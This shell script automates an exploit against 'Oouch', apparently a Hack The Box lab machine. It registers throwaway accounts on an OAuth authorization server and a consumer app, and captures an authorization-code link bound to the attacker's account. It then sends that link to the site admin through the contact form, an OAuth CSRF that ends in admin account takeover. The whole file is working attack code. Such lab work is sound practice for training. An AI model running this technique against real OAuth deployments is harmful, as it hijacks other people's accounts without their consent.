#!/bin/sh

GREEN="\e[0;32m"
CLEAR="\e[m"

USERNAME=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
PASSWORD="pwnage123"

# Register authorization user
echo "${GREEN}Registering user on authorization server - ${CLEAR}${USERNAME}"
curl 'http://authorization.oouch.htb:8000/signup/' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw "csrfmiddlewaretoken=EHKGKseLDMhbLjLQyeiexrGHuOB9YJiehqOaD0SjjQcCrDDYRhZioJ0mmIVjK3EV&username=${USERNAME}&email=${USERNAME}%40email.com&password1=${PASSWORD}&password2=${PASSWORD}"

# Login authorization user and get cookie
echo "${GREEN}Logging into authorization server to get sessions cookie${CLEAR}"
A_SESSION_ID=$(curl -v 'http://authorization.oouch.htb:8000/login/' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: csrftoken=iKF5itJYptsGv7g3BN79EKYZzLhIemf7a62GC5LSXDYIGxrHDRrEIvXyuci4k99k' --data-raw "csrfmiddlewaretoken=TiRHSWkN6TQutdXEmI1HcE6IEFkspiy1LEeicymHE3mwED8ioMlcgp5hz6lOv5se&username=${USERNAME}&password=${PASSWORD}" 2>&1 | grep sessionid | sed -r 's/.*sessionid=(\w+);.*/\1/')

echo "    ${GREEN}Got authorization session cookie: ${CLEAR} ${A_SESSION_ID}"

echo "${GREEN}Getting token/code url for linking the admin account${CLEAR}"
TOKEN_URL=$(curl -v 'http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H 'Referer: http://authorization.oouch.htb:8000/oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read' -H "Cookie: csrftoken=zzPf6uron6TdWlsqY1Rukb5GBnWlvM870RVoW2Q9ZWtEK3PmsxnsNp4Uv7lm9AjR; sessionid=${A_SESSION_ID}" --data-raw "csrfmiddlewaretoken=4bQYMzOq9z8PXZoRob64mvACboMoEBmKxv16oMApwJUAiAULjGbLV3Y4wZEtSWaB&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize" 2>&1 | grep 'code=' | sed -r 's/.*(http:)/\1/')

echo "    ${GREEN}Got token url: ${CLEAR} ${TOKEN_URL}"

# Get Session Cookie
echo "${GREEN}Getting consumer session id and csrf token${CLEAR}"
C_SESSION_ID=$(curl -v 'http://consumer.oouch.htb:5000/register' 2>&1 | grep session | sed -r 's/.*session=([a-zA-Z0-9._-]+);.*/\1/')
echo "    ${GREEN}Got consumer sessions cookie: ${CLEAR}${C_SESSION_ID}"

# Get CSRF Token
C_CSRF_TOKEN=$(curl 'http://consumer.oouch.htb:5000/register' -H "Cookie: session=${C_SESSION_ID}" | grep csrf_token | sed -r 's/.*value="([a-zA-Z0-9._-]+)">.*/\1/')
echo "    ${GREEN}Got consumer csrf token: ${CLEAR}${C_CSRF_TOKEN}"

# Register consumer user
echo "${GREEN}Registering user on consumer${CLEAR}"
curl --silent 'http://consumer.oouch.htb:5000/register' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' \
  -H 'Referer: http://consumer.oouch.htb:5000/register' \
  -H "Cookie: session=${C_SESSION_ID}" \
  --data-raw "csrf_token=${C_CSRF_TOKEN}&username=${USERNAME}&email=${USERNAME}%40test.com&password=${PASSWORD}&cpassword=${PASSWORD}&submit=Register"
echo "${USERNAME}"

# Login consumer user and get cookie
echo "${GREEN}Logging in to consumer account${CLEAR}"
C_SESSION_ID=$(curl -v 'http://consumer.oouch.htb:5000/login' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H 'Referer: http://consumer.oouch.htb:5000/login' -H "Cookie: session=${C_SESSION_ID}" --data-raw "csrf_token=${C_CSRF_TOKEN}&username=${USERNAME}&password=${PASSWORD}&remember_me=n&submit=Sign+In" 2>&1 | grep "Set-Cookie: session" | sed -r 's/.*session=([a-zA-Z0-9._-]+);.*/\1/')
echo "    ${GREEN}New session ID: ${CLEAR}${C_SESSION_ID}"

# Send message to admin
echo "${GREEN}Sending message to admin${CLEAR}"
curl --silent -X POST 'http://consumer.oouch.htb:5000/contact' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' \
  -H 'Referer: http://consumer.oouch.htb:5000/contact' \
  -H "Cookie: session=${C_SESSION_ID}" \
  -d "csrf_token=${C_CSRF_TOKEN}&textfield=${TOKEN_URL}&submit=Send" | grep "message was sent"

echo "\n${GREEN}Now log into the authorization server in the browser with ${CLEAR}${USERNAME}:${PASSWORD}${GREEN}, and then login to the admin account by visiting ${CLEAR}http://consumer.oouch.htb:5000/oauth/login"
